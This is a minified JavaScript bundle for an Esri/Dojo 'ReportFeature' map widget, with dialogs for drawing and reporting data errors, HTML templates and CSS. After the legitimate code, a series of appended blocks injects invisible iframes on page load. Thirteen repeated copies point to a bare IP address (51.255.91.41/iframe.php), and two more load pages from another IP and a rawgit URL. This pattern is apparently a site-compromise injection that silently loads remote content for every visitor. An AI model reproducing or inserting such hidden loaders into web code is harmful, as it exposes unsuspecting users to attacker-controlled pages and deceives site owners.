k[h],e=k[b.confirm[h]],q("type",a)||q("type",e)||"text"!=a.type&&"textarea"!=a.type&&"password"!=a.type||e.type!=a.type||e.value==a.value||m.isInvalid(a.name)||/^\s*$/.test(e.value)||(g[g.length]=a.name);return m};n.evaluateConstraint=function(k,b,f,g){k=b[0];b=b.slice(1);b.unshift(g.value);return"undefined"!=typeof k&&"string"!=typeof k?k.apply(null,b):"undefined"!=typeof k&&"string"==typeof k&&l.isFunction(l.getObject(k))?l.getObject(k).apply(null,b):!1};return n.check})},"widgets/ReportFeature/DrawErrorDialog":function(){define("dojo/_base/declare dojo/_base/array dojo/on dojo/string dojo/dom-construct dojo/dom-style dijit/_WidgetBase dijit/_TemplatedMixin dojo/query dojo/i18n!esri/nls/jsapi esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/geometry/Polygon esri/tasks/datareviewer/ReviewerResultsTask ./InfoWindowContent dojo/text!./DrawErrorDialog.html".split(" "),
function(k,l,n,m,b,f,g,r,q,e,a,d,c,t,h,u,y){var p=new a({type:"esriSMS",style:"esriSMSCircle",size:12,xoffset:0,yoffset:0,color:[0,0,255,51],outline:{type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,128],width:1}}),z=new d({type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,51],width:2}),v=new c({type:"esriSFS",style:"esriSFSSolid",color:[0,0,255,26],outline:{type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,128],width:1}});return k([g,r],{templateString:y,baseClass:"drs-draw-error-dialog",buildRendering:function(){this.inherited(arguments);
this._initDom()},_initDom:function(){var a=this.getLayerOptions();void 0!==a&&""!==a&&b.place(a,this.selectLayer)},_setDrawBoxAttr:function(a){this.setDrawBox(a)},setDrawBox:function(a){this.drawBox=a;this.drawBox.placeAt(this.drawBoxNode);this.drawBox.setMap(this.map);this.drawBox.setPointSymbol(p);this.drawBox.setLineSymbol(z);this.drawBox.setPolygonSymbol(v)},postCreate:function(){this.inherited(arguments);this._initEvents()},startup:function(){this.inherited(arguments);this.drawBox.startup()},
_initEvents:function(){var a=this;this.own(n(this.selectLayer,"change",function(b){var d=b.target.value;b=l.filter(a.config.layers,function(a){return a.id===d});void 0!==b&&0<b.length&&void 0===a.map.getLayer(d)?a.emit("Error",{},[a.nls.errorMapService]):(e.toolbars.draw.addPoint=a.nls.drawFeatureMapPoint,d?a.startDrawing():a.cancelDrawing())}));this.own(n(this.map.infoWindow,"hide",function(){var b=q(".actionsPane");void 0!==b&&null!==b&&0<b.length&&(b[0].style.display="");a.emit("InfoWindowHide")}));
this.own(n(this.drawBox,"DrawEnd",function(b,d,c){a._onDrawEnd(b,d,c)}))},startDrawing:function(){f.set(this.drawErrorInstructionsNode,"display","");f.set(this.drawBoxNode,"display","")},cancelDrawing:function(){this.drawBox.clear();this.drawBox.deactivate();f.set(this.drawErrorInstructionsNode,"display","none");f.set(this.drawBoxNode,"display","none")},_onDrawEnd:function(a){var d=this,c=a.geometry,e;"extent"===c.type&&(e=new t(c.spatialReference),e.addRing([[c.xmin,c.ymin],[c.xmin,c.ymax],[c.xmax,
c.ymax],[c.xmax,c.ymin],[c.xmin,c.ymin]]),c=e);this._resultGeometry=c;this.drawBox.clear();this.drawBox.deactivate();if(null!==this._resultGeometry){switch(this._resultGeometry.type){case "polyline":c=this._resultGeometry.getExtent().getCenter();break;case "polygon":c=this._resultGeometry.getCentroid();break;default:c=this._resultGeometry}this.map.infoWindow.setTitle(this.nls.infoWindowTitle);this.infoWindowContent=new u({nls:this.nls,title:this.nls.draw,includeReportedBy:this.config.includeReportedBy,
defaultUserName:this.config.defaultUserName,onReportSubmit:function(a){d.submitReport(a)}},b.create("div"));this.infoWindowContent.startup();e=l.filter(d.config.layers,function(a){return a.id===d.selectLayer.value});this.infoWindowContent.set("layerName",e[0].alias);this.infoWindowContent.set("graphic",a);n.once(this.map.infoWindow,"hide",function(){d.map.setInfoWindowOnClick(!1)});this.map.infoWindow.destroyDijits();q(".actionsPane")[0].style.display="none";this.map.infoWindow.setContent(this.infoWindowContent.domNode);
this.map.infoWindow.resize(300,600);this.map.infoWindow.show(c);this.emit("DrawEnd")}},submitReport:function(a){var b=this;a.sessionId=this._sessionId;this.map.infoWindow.hide();this._reviewerResultsTask.writeResult(a,this._resultGeometry).then(function(a){b._onWriteResultComplete(a)},function(a){b._onWriteResultError(a)})},_onWriteResultComplete:function(a){a&&a.success?this.emit("Message",{},["",this.nls.reportMessage]):this.emit("Error",{}[this.nls.errorReportMessage])},_onWriteResultError:function(a){this.emit("Error",
{},[a.message,a])},destroy:function(){this.drawBox&&(this.drawBox.destroy(),this.drawBox=null);this.inherited(arguments)},reset:function(){this.selectLayer.selectedIndex=0;void 0!==this.infoWindowContent&&null!==this.infoWindowContent&&this.infoWindowContent.destroyRecursive();this.map.setInfoWindowOnClick(!1);this.cancelDrawing()},setDrsUrl:function(a){this._reviewerResultsTask=new h(a)},setReviewerSession:function(a){isNaN(a)?this._sessionId=1:this._sessionId=parseInt(a,10)},getLayerOptions:function(){var a=
"";l.forEach(this.config.layers,function(b){!0===b.show&&(a+=m.substitute('\x3coption value\x3d"${id}"\x3e${alias}\x3c/option\x3e',b))});return a}})})},"widgets/ReportFeature/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/ReportFeature/InfoWindowContent.html":'\x3cdiv\x3e\r\n  \x3cform data-dojo-attach-point\x3d"formNode" class\x3d"drs-info-window-form"\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel\x3e${nls.layerLabel}\x3c/label\x3e\r\n      \x3cspan data-dojo-attach-point\x3d"layerNode" style\x3d"width:100%; padding: 0 3px 0 0;"\x3e\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel\x3e${nls.reviewStatusLabel}\x3c/label\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"statusNode" name\x3d"reviewStatus" class\x3d"jimu-input drs-infowindow-input drs-infowindow-input"\x3e\r\n        \x3coption\x3e\x3c/option\x3e\r\n      \x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel\x3e${nls.notesLabel}\x3c/label\x3e\r\n      \x3ctextarea data-dojo-attach-point\x3d"notesNode" name\x3d"notes" class\x3d"jimu-input drs-infowindow-input" rows\x3d"2" \x3e\x3c/textarea\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel\x3e${nls.severityLabel}\x3c/label\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"severityNode" name\x3d"severity" class\x3d"jimu-input drs-infowindow-input"\x3e\r\n        \x3coption\x3e1\x3c/option\x3e\r\n        \x3coption\x3e2\x3c/option\x3e\r\n        \x3coption\x3e3\x3c/option\x3e\r\n        \x3coption\x3e4\x3c/option\x3e\r\n        \x3coption selected\x3e5\x3c/option\x3e\r\n      \x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"dynamicRow"\x3e\r\n      \x3clabel\x3e${nls.reportedByLabel}\x3c/label\x3e\r\n      \x3cinput type\x3d"text" data-dojo-attach-point\x3d"reportedByNode" name\x3d"reviewTechnician" class\x3d"jimu-input drs-infowindow-input"/\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"drs-buttons jimu-align-trailing"\x3e\r\n      \x3cinput type\x3d"submit" value\x3d"${nls.reportButton}" class\x3d"jimu-btn"/\x3e\r\n    \x3c/div\x3e\r\n  \x3c/form\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/ReportFeature/SelectFeatureDialog.html":'\x3cdiv\x3e\r\n\t\x3cp style\x3d"width:90%;height:25px;margin: 20px 5px 0px 7px;"\x3e${nls.chooseALayer}: \x3c/p\x3e\r\n\t\x3cselect data-dojo-attach-point\x3d"selectLayer"  class\x3d"jimu-input" style\x3d"width:90%;height:31px;margin: 5px 5px 5px 7px;"\x3e\r\n    \x3coption value\x3d""\x3e\x3c/option\x3e\r\n  \x3c/select\x3e\r\n  \r\n  \x3cp style\x3d"display: none;" data-dojo-attach-point\x3d"clickAFeatureNode"  style\x3d"width:90%;height:25px;margin: 5px 5px 5px 7px;" \x3e${nls.clickAFeature}\x3c/p\x3e\r\n  \x3cp class\x3d"drs-loading-features" style\x3d"display: none;" data-dojo-attach-point\x3d"loadingFeaturesNode" \x3e${nls.loadingFeatures}\x3c/p\x3e\r\n\x3c/div\x3e',
"url:widgets/ReportFeature/DrawErrorDialog.html":'\x3cdiv\x3e\r\n\t\x3cp style\x3d"width:90%;height:25px;margin: 20px 5px 0px 7px;"\x3e${nls.chooseALayer}: \x3c/p\x3e\r\n\t\x3cselect data-dojo-attach-point\x3d"selectLayer" class\x3d"jimu-input" style\x3d"width:90%;height:31px;margin: 5px 5px 5px 7px;"\x3e\r\n    \x3coption value\x3d""\x3e\x3c/option\x3e\r\n  \x3c/select\x3e\r\n  \r\n  \x3cp style\x3d"display: none;" data-dojo-attach-point\x3d"drawErrorInstructionsNode" style\x3d"width:90%;height:25px;margin: 5px 5px 5px 7px;" \x3e${nls.drawErrorInstructions}\x3c/p\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"drawBoxNode" style\x3d"display: none"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/ReportFeature/Widget.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"report-feature-content" data-dojo-attach-point\x3d"content"\x3e\r\n\t\t\x3cdiv class\x3d"select-tab-node" data-dojo-attach-point\x3d"selectTabNode" id\x3d"selectTabNode"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"selectFeatureDialogNode"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"draw-tab-node" data-dojo-attach-point\x3d"drawTabNode"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"drawErrorDialogNode"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/ReportFeature/css/style.css":".drs-widget-report-feature .report-feature-content{position: relative; width:100%; height:100%;}.drs-widget-report-feature\x3e.jimu-tab\x3e.control{margin:-14px -14px 0px -14px;}.BoxTheme .drs-widget-report-feature\x3e.jimu-tab\x3e.control{margin:0px -14px 0px -14px;}.drs-widget-report-feature .drs-loading-features {background: url('../images/loading.gif') no-repeat left center; padding-left: 20px;}.drs-info-window-form .drs-input-err {border-color: #f00;}.drs-info-window-form label {display: block; margin-top: 1em;}.drs-info-window-form .drs-buttons {margin-top: 1em;}.drs-info-window-form textarea.jimu-input {width: 100%;}.TabTheme .drs-widget-report-feature .jimu-tab\x3e.control\x3e.tab.jimu-state-selected{border-top: 0;}.drs-widget-report-feature .jimu-widget-frame.jimu-container {overflow-x: auto; overflow-y: auto; position: relative; padding: 0px 0px 14px 0px; background-color: white;}.drs-widget-report-feature .selectLayer{border-color: #d2dae2; background-color: #fafafc; color: #555555; font-size: 14x;}.drs-widget-report-feature .selectLayer:active{border-color: #c3c3c3; background-color: #ffffff; color: #000000; font-family: \"AVENIR LT STD 35 LIGHT\"; font-size: 14x;}.drs-infowindow-input{width:100%; padding: 1px 3px 0 0; font-size: 13px;}",
"*now":function(k){k(['dojo/i18n!*preload*widgets/ReportFeature/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidget jimu/dijit/TabContainer jimu/PanelManager jimu/dijit/Message jimu/dijit/DrawBox esri/toolbars/draw dojo/i18n!esri/nls/jsapi dojo/_base/lang ./SelectFeatureDialog ./DrawErrorDialog".split(" "),function(k,l,n,m,b,f,g,r,q,e,a){return k([l],{baseClass:"drs-widget-report-feature",name:"ReportFeature",_defaultToolString:"",buildRendering:function(){this.inherited(arguments);this._initDom()},_initDom:function(){var b=this;this.selectFeatureDialog=new e({config:this.config,
nls:this.nls,map:this.map,onSelectFeature:function(){b.close()},onInfoWindowHide:function(){},onMessage:function(a,d){b.showMessage(a,d)},onError:function(a,d){b.showError(a,d)}},this.selectFeatureDialogNode);this.drawErrorDialog=new a({config:this.config,nls:this.nls,map:this.map,drawBox:new f({types:["point","polyline","polygon"],showClear:!1}),onDrawEnd:function(){b.close()},onInfoWindowHide:q.hitch(this,function(){if(void 0!==b.selectFeatureDialog.infoWindowContent&&null!==b.selectFeatureDialog.infoWindowContent||
null!==b.drawErrorDialog.infoWindowContent&&void 0!==b.drawErrorDialog.infoWindowContent)b.open(),b.selectFeatureDialog.infoWindowContent&&b.selectFeatureDialog.infoWindowContent.destroyRecursive(),b.drawErrorDialog.infoWindowContent&&b.drawErrorDialog.infoWindowContent.destroyRecursive(),b.selectFeatureDialog.infoWindowContent=null,b.drawErrorDialog.infoWindowContent=null}),onMessage:function(a,d){b.showMessage(a,d)},onError:function(a,d){b.showError(a,d)}},this.drawErrorDialogNode);this.tabContainer=
new n({tabs:[{title:this.nls.select,content:this.selectTabNode},{title:this.nls.draw,content:this.drawTabNode}],selected:this.nls.select},this.content)},postCreate:function(){var a=this.config.drsUrl,b=this.config.sessionID;this.inherited(arguments);this._initEvents();this.selectFeatureDialog.setDrsUrl(a);this.selectFeatureDialog.setReviewerSession(b);this.drawErrorDialog.setDrsUrl(a);this.drawErrorDialog.setReviewerSession(b)},_initEvents:function(){var a=this;this.own(this.tabContainer.on("tabChanged",
function(b){a.tabContainer.selected=b;a.map.setInfoWindowOnClick(!1);b===a.nls.select?(void 0!==a.drawErrorDialog.drawBox&&a.drawErrorDialog.drawBox.deactivate(),a.selectFeatureDialog.reset()):b===a.nls.draw&&(void 0!==a.selectFeatureDialog.selectionToolbar&&a.selectFeatureDialog.selectionToolbar.deactivate(),a.drawErrorDialog.reset())}))},startup:function(){this.inherited(arguments);this.selectFeatureDialog.startup();this.drawErrorDialog.startup();this.tabContainer.startup()},open:function(){var a=
this.getPanel();m.getInstance().openPanel(a.id)},close:function(){m.getInstance().closePanel(this.id+"_panel")},onClose:function(){null!==this.selectFeatureDialog.selectionToolbar&&void 0!==this.selectFeatureDialog.selectionToolbar&&(this.selectFeatureDialog.selectionToolbar.deactivate(),r.toolbars.draw.addPoint=this._defaultToolString);this.map.setInfoWindowOnClick(!0)},onOpen:function(){""===this._defaultToolString&&(this._defaultToolString=r.toolbars.draw.addPoint);this.tabContainer.selected===
this.nls.select&&""!==this.selectFeatureDialog.selectLayer.value&&(r.toolbars.draw.addPoint=this.nls.selectFeatureMapPoint)},onActive:function(){this.map.setInfoWindowOnClick(!1);this.tabContainer.selected===this.nls.select&&null!==this.selectFeatureDialog.selectionToolbar&&void 0!==this.selectFeatureDialog.selectionToolbar&&""!==this.selectFeatureDialog.selectLayer.value&&this.selectFeatureDialog.selectionToolbar.activate(g.POINT)},showMessage:function(a,c){new b({message:a,titleLabel:c})},showError:function(a,
c){new b({message:a,titleLabel:this.nls.errorTitle,type:"error"});console.error(c||a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});